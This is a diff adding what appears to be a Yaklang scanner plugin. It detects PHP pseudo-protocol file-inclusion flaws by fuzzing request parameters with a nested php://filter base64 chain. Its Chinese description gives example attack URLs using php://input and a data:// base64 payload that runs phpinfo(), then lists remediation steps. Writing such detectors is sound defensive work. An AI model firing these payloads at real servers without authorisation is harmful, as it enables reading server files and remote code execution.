@@ -1,0 +1,70 @@
+descInfo = `PHP伪协议或伪装协议是PHP中用于访问各种I/O流的方法，它们可以用于包含文件、访问网络资源、操作内存数据等。当提到“PHP伪协议文件包含漏洞”时，通常是指利用PHP中的一些特殊协议（如php://、data://、file://等）来执行文件包含攻击（File Inclusion Attack）。
+
+这种类型的漏洞通常出现在PHP的include、require、include_once或require_once语句中，这些语句用于包含并运行PHP文件或其他文件类型的内容。如果这些语句没有正确地限制可包含的文件，攻击者可能会利用这一点包含恶意文件，或者通过伪协议执行恶意的PHP代码。
+
+例如，一个PHP应用程序可能允许用户通过一个参数来指定要包含的文件，如下所示：
+
+    include($_GET['file'] . ".php");
+
+如果没有适当的验证，攻击者可以通过URL参数传递一个指向恶意文件的路径，或者使用伪协议来执行攻击，如：
+
+    http://example.com/index.php?file=php://input
+
+攻击者可以通过POST请求发送PHP代码，该代码将通过php://input流被包含和执行，因为php://input允许读取原始的POST数据。
+
+此外，攻击者还可能使用data://协议来直接在URL中包含base64编码的PHP代码，如：
+
+    http://example.com/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+
+上面的URL实际上包含了一个base64编码的字符串，该字符串解码后是<?php phpinfo();?>，这会导致服务器执行phpinfo()函数，显示有关服务器配置的详细信息。
+
+危害包括：
+
+1. 远程代码执行：攻击者可能会远程执行任意代码，这是最严重的风险，因为它可能导致服务器完全被控制。
+2. 信息泄露：攻击者可以获取敏感配置信息，例如数据库凭据、API密钥等。
+3. 系统文件访问：攻击者可能会读取系统文件，获取服务器信息或更多敏感数据。
+4. 会话劫持：通过包含恶意文件，攻击者可能会劫持用户会话或执行跨站脚本攻击（XSS）。
+`
+
+# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
+mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
+
+    benchmarkResponse, _, _ = poc.HTTP(req, poc.https(isHttps /*type: bool*/))
+    benchmarkResponse = string(benchmarkResponse)
+
+    for param in freq.GetCommonParams() {
+        originValue = param.GetFirstValue()
+        p = "Vm0w"
+        firstPayload = x`php://filter/{{repeat:str(convert.base64-encode/|10)}}/resource=`[0] + originValue
+        response, err := param.Fuzz(firstPayload).ExecFirst()
+        if err != nil {
+            log.error(err)
+            continue
+        }
+        if p in response.ResponseRaw {
+            risk.NewRisk(
+                url, risk.severity("high"),
+                risk.titleVerbose("PHP伪协议文件包含文件: %v" % url),
+                risk.title("PHP Protocol Filter Base64 ReadFile: %v" % url),
+                risk.type("file_include"), risk.type("文件包含漏洞"),
+                risk.request(response.RequestRaw), risk.response(response.ResponseRaw),
+                risk.payload(firstPayload), risk.parameter(param.String()),
+                risk.description(descInfo), risk.solution(`
+
+为了防止这种类型的漏洞，开发者需要确保：
+
+1. 对所有用户输入进行验证和清理，不允许包含不受信任的文件。
+2. 使用适当的配置限制PHP可以访问的文件。
+3. 禁用或限制危险的PHP函数（如eval()）和伪协议（如allow_url_include配置项）。
+
+PHP伪协议文件包含漏洞是一种严重的安全漏洞，需要通过编码最佳实践和服务器配置来缓解。检查所有的 include/require 的使用
+
+`)
+            )
+            continue
+        }
+    }
+}
+
+
